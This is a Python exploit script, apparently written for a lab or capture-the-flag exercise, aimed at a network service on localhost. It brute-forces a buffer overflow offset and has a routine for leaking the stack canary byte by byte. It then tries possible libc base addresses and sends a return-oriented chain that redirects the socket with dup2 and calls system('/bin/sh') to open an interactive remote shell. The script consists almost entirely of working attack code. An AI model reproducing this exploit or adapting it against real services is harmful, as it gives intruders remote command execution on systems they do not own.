import struct
import time
import socket
from pwn import *

HOST = "localhost"
PORT = 9999

def generar_direcciones_libc(base_start= 0xf7c00000, base_end=0xf7d00000, page_size=0x1000):
    return [addr for addr in range(base_start, base_end, page_size)]

def get_connection():
   s=socket.socket()
   s.connect((HOST,PORT))
   return s

def interact_shell(s):
    sys.stdout.flush()
    s.settimeout(0.5)
    s.send("whoami\n".encode())
    time.sleep(0.2)
    sys.stdout.write(s.recv(4096).decode(errors='ignore'))
    while True:
        try:
            sys.stdout.flush()
            print("Prueba a mandar cositas")
            c = input("$ -> ")
            s.send((c + '\n').encode())
            time.sleep(0.5)
            sys.stdout.write(s.recv(4096).decode(errors='ignore'))
        except socket.timeout:
            continue
        except KeyboardInterrupt as e:
            print("quit")
            s.close()
            break

def send_payload(payload_data: bytes, timeout: float = 2.0):
    """
    Send payload to target server and receive response.
    Args:
        payload_data: The data to send to the target (bytes)
        timeout: Timeout in seconds for socket operations
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if timeout > 0:
        sock.settimeout(timeout)
    try:
        sock.connect((HOST, PORT))
        # Send payload
        sock.send(payload_data)
        # Receive response
        response = sock.recv(2048)
        if response:
            #print(f"Response: {response}")
            return True
    except socket.timeout:
        print("Socket timeout occurred.")
    except socket.error as sock_error:
        print(f"Socket error: {sock_error}")
    finally:
        sock.close()
    return False

def calcular_offset():
    """
    Calculate the offset for the payload.
    """
    # This is a placeholder function. The actual implementation will depend on the target binary.
    # For example, you might want to use gdb or another tool to find the correct offset.
    i = 20
    while True:
        # print(f"Trying offset: {i}")
        PAYLOAD = b"A" * i
        RESPONSE = send_payload(PAYLOAD)
        if not RESPONSE:
            print(f"[+] GOT IT: offset = {i-1}")
            return i-1
        i += 1


def byte_for_byte(payload,len_payload=8):
    p = payload
    start = len(p)
    stop = len(p) + len_payload

    while len(p) < stop:
        for i in range(0, 256):
            attempt = p + bytes([i])
            res = send_payload(attempt)
            # print(f"Trying {attempt}")
            if res:
                p = attempt
                print("[+] Byte found 0x%02x" % i)
                break

            if i == 255:
                print("[-] Exploit failed")
                sys.exit(-1)
    # Extraer los últimos 8 bytes para obtener el valor correcto de EBP y EBX
    result = p[-len_payload:]
    return result

offset = calcular_offset()
print("[+] Byte for byte canary ...")
canary = struct.pack("<I",0xb642ef00)   # byte_for_byte(b"A" * offset, 4)
ebp = b"BBBBBBBB" # byte_for_byte(offset)
print(f"[+] Canary value is 0x{canary.hex()}")

libc = ELF("/usr/lib32/libc.so.6", checksec=False)  # usa la misma que el servidor
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
ls_command_offset = next(libc.search(b"/etc/shells")) + 0x9  #  Te quedas con el "ls" de shells para ejecutar el comando
binsh_offset = next(libc.search(b"/bin/sh")) # Te quedas con el "/bin/sh" de shells para ejecutar el comando
dup2_offset = libc.symbols["dup2"]
gadget1_offset = 0x000238a3
gadget2_offset = 0x0019ef7b
print(f"system_offset: {hex(system_offset)}")
print(f"exit_offset: {hex(exit_offset)}")
print(f"command_offset: {hex(ls_command_offset)}")

libc_base_guesses = generar_direcciones_libc()

print(f"Guesses: {len(libc_base_guesses)}")

for base in libc_base_guesses:
    system = struct.pack("<I", (base + system_offset))
    exit_addr = struct.pack("<I", (base + exit_offset))
    ls_cmd = struct.pack("<I", (base + ls_command_offset))
    dup2_cmd = struct.pack("<I", (base + dup2_offset))
    binsh = struct.pack("<I", (base + binsh_offset))
    gadget1 = struct.pack("<I",(base + gadget1_offset))
    gadget2 = struct.pack("<I", (base +gadget2_offset ))

    # Payload para dos llamadas seguidas a system: primero 'ls', luego '/bin/sh'
    PAYLOAD = b"A" * offset
    PAYLOAD += canary
    PAYLOAD += ebp
    PAYLOAD += system
    PAYLOAD += gadget1  # Dirección de retorno tras la primera llamada
    PAYLOAD += ls_cmd
    PAYLOAD += dup2_cmd
    PAYLOAD += gadget2
    PAYLOAD += p32(4)
    PAYLOAD += p32(0)
    PAYLOAD += dup2_cmd
    PAYLOAD += gadget2
    PAYLOAD += p32(4)
    PAYLOAD += p32(1)
    PAYLOAD += dup2_cmd
    PAYLOAD += gadget2
    PAYLOAD += p32(4)
    PAYLOAD += p32(2)
    PAYLOAD += system
    PAYLOAD += gadget1  # Dirección de retorno tras la primera llamada
    PAYLOAD += ls_cmd
    PAYLOAD += system
    PAYLOAD += exit_addr  # Dirección de retorno tras la primera llamada
    PAYLOAD += binsh
    try:
        s = get_connection()
        s.settimeout(0.5)
        s.send(PAYLOAD)
        response = s.recv(4096); # read banner
        if response:
            s.settimeout(None)
            print("[+] Shell abierta, respuesta inicial:")
            print(f"Respuesta: {response}")
            interact_shell(s)
            break;
        else:
            s.close()
    except socket.timeout:
        print("Socket timeout occurred.")


print("[+] Finished wihout success")